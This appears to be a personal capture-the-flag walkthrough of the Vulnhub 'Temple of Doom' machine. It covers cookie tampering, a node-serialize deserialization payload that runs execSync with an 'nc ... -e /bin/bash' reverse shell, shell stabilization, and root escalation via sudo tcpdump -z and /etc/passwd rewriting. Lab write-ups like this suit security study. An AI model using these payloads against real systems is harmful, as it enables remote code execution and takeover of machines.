#javascript-deserialization #lateral-esc
Nmap:
```
22/tcp  open  ssh     OpenSSH 7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 95:68:04:c7:42:03:04:cd:00:4e:36:7e:cd:4f:66:ea (RSA)
|   256 c3:06:5f:7f:17:b6:cb:bc:79:6b:46:46:cc:11:3a:7d (ECDSA)
|_  256 63:0c:28:88:25:d5:48:19:82:bb:bd:72:c6:6c:68:50 (ED25519)

666/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
MAC Address: 08:00:27:5B:A7:AE (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
```
says the server:
![[walkthroughs/Vulnhub/Temple_of_doom/IMG/Pasted image 20230806131856.png]]
I fuzzed the website , after I visited again I saw this error:
![[walkthroughs/Vulnhub/Temple_of_doom/IMG/Pasted image 20230806133359.png]]
I first thought that it was misconfigured by fuzzing but no , this error comes when we try to send some json object 
![[walkthroughs/Vulnhub/Temple_of_doom/IMG/Pasted image 20230806133538.png]]
so what could have we sent?: 
also you should visit the site with http, so when I visit with another browser , I saw under construction again.....wait is it creating session ? and then sending the cookie which is making this error appear? and according to article that cookie is not in json format or characters are bad
yep , yep, and look in base64 too:
![[walkthroughs/Vulnhub/Temple_of_doom/IMG/Pasted image 20230806134213.png]]
![[walkthroughs/Vulnhub/Temple_of_doom/IMG/Pasted image 20230806134329.png]]
`{"username":"Admin","csrftoken":"u32t4o3tb3gg431fs34ggdgchjwnza0l=","Expires=":Friday, 13 Oct 2018 00:00:00 GMT"}base64: invalid input
`
look closely there's a quote missing in the expires value we fix it and resend the request:
![[walkthroughs/Vulnhub/Temple_of_doom/IMG/Pasted image 20230806232539.png]]
so we are admin ... hmmm now what
When we look at the machine there is no functionality whatsoever on the admin page too.... this means that the only thing here going to the server is the cookie that we are providing it , if you look closely then you will understand that when we change the name from admin to any other , it will display that too , so which means it's using base64 for serializing the data and then at the backend it deserializes the data from the base64 so it may be vulnerable form js-deserialization attack:
let's give it a payload:
look at this blog at the medium
`https://medium.com/@chaudharyaditya/insecure-deserialization-3035c6b5766e`
```json
{"username":"_$$ND_FUNC$$_function (){return require('child_process').execSync('id',(error, stdout, stderr)=>{ console.log(stdout); }); }()","csrftoken":"u32t4o3tb3gg431fs34ggdgc
```

`_$$ND_FUNC$$_function (){return require('child_process').execSync('id',(error, stdout, stderr)=>{ console.log(stdout); }); }()`
![[walkthroughs/Vulnhub/Temple_of_doom/IMG/Pasted image 20230817190039.png]]

```json
{"username":"_$$ND_FUNC$$_function (){return require('child_process').execSync('nc 192.168.90.130 4444 -e /bin/bash',(error, stdout, stderr)=>{ console.log(stdout); }); }()","csrftoken":"u32t4o3tb3gg431fs34ggdgc
```
and we get the shell , we stabilize the shell:
***
step 1:
```python
/usr/bin/python -c 'import pty;pty.spawn("/bin/bash")'
```

step 2:
do `ctrl+z` your main system terminal should have opened and then write this:
```
stty raw -echo; fg
```

then press `enter` two times , your terminal for the machine should be back , also type this to get some env variables like clear in that machine:
```
export TERM=xterm
```
***

![[walkthroughs/Vulnhub/Temple_of_doom/IMG/Pasted image 20230818155146.png]]
![[walkthroughs/Vulnhub/Temple_of_doom/IMG/Pasted image 20230818162544.png]]
![[walkthroughs/Vulnhub/Temple_of_doom/IMG/Pasted image 20230818162558.png]]
![[walkthroughs/Vulnhub/Temple_of_doom/IMG/Pasted image 20230818162636.png]]

![[walkthroughs/Vulnhub/Temple_of_doom/IMG/Pasted image 20230818162838.png]]
so first I built the connection with nc and then we gave the different command {2nd one}:
![[walkthroughs/Vulnhub/Temple_of_doom/IMG/Pasted image 20230818163258.png]]
![[walkthroughs/Vulnhub/Temple_of_doom/IMG/Pasted image 20230818163433.png]]

```
COMMAND='/bin/bash'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
```

```
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /home/fireman/she -Z root
```

![[walkthroughs/Vulnhub/Temple_of_doom/IMG/Pasted image 20230818170636.png]]
![[walkthroughs/Vulnhub/Temple_of_doom/IMG/Pasted image 20230818170726.png]]
OR
rewrite the /etc/passwd
![[walkthroughs/Vulnhub/Temple_of_doom/IMG/Pasted image 20230818165943.png]]
![[walkthroughs/Vulnhub/Temple_of_doom/IMG/Pasted image 20230818170129.png]]
![[walkthroughs/Vulnhub/Temple_of_doom/IMG/Pasted image 20230818170620.png]]
